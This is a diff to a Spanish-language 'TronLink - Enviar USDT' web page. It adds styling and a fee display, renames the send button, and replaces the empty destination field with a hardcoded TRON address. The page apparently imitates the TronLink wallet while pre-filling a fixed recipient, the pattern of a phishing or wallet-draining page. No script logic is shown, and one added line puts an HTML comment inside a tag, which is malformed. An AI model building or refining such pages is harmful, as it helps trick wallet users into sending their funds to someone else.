@@ -6,7 +6,6 @@
     <title>TronLink - Enviar USDT</title>
 
     <style>
-        /* Estilos como en tu código original */
         :root {
             color-scheme: light;
         }
@@ -148,6 +147,22 @@
         .tw-btn:disabled {
             background-color: #b3ccff;
         }
+    
+        .tw-address-box {
+            border: 1px solid #e3e5e8;
+            border-radius: 14px;
+            padding: 12px 14px;
+            background: #ffffff;
+        }
+
+        .tw-address-box .tw-label {
+            margin-top: 0;
+        }
+
+        .tw-address-box .tw-input-row {
+            margin-bottom: 0;
+        }
+
     </style>
 </head>
 
@@ -182,7 +197,9 @@
 
     </div>
 
-    <div id="walletInfo" class="tw-input-group" style="display: none;">
+    <!-- Dirección destino -->
+
+    <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
         <label class="tw-label">Dirección conectada</label>
 
         <div class="tw-input-row">
@@ -199,7 +216,7 @@
         </div>
     </div>
 
-    <div class="tw-input-group">
+    <div class="tw-input-group tw-address-box">
         <label class="tw-label" for="addressDisplay">
             Dirección de destino
         </label>
@@ -209,13 +226,15 @@
                 id="addressDisplay"
                 class="tw-input"
                 type="text"
-                placeholder="Dirección TRC-20"
+                value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" <!-- Dirección predeterminada -->
             >
             <span class="tw-action-text" id="pasteAddress">
                 Pegar
             </span>
         </div>
     </div>
+
+    <!-- Cantidad -->
 
     <div class="tw-input-group">
         <label class="tw-label" for="amountDisplay">
@@ -242,14 +261,52 @@
         </div>
     </div>
 
+    <div id="feeInfo" style="
+        display: none;
+        margin: -7px 16px 16px 16px;
+        text-align: right;
+        white-space: nowrap;
+        font-size: 11px;
+        line-height: 1.2;
+    ">
+        <span style="
+            font-size: 11px;
+            color: #717680;
+        ">
+            Fee estimada:
+        </span>
+
+        <span id="feeDisplay" style="
+            font-size: 11px;
+            font-weight: 600;
+            color: #111111;
+            margin-left: 3px;
+        ">
+            Calculando...
+        </span>
+
+        <span style="
+            font-size: 11px;
+            font-weight: 600;
+            color: #717680;
+            margin-left: 1px;
+        ">
+            TRX
+        </span>
+    </div>
+
+    <!-- Estado -->
+
     <div id="status" class="status-box"></div>
+
+    <!-- Botón -->
 
     <div class="tw-btn-container">
         <button
             class="tw-btn"
             id="connectBtn"
         >
-            Conectar y Enviar
+            Siguiente
         </button>
     </div>
 
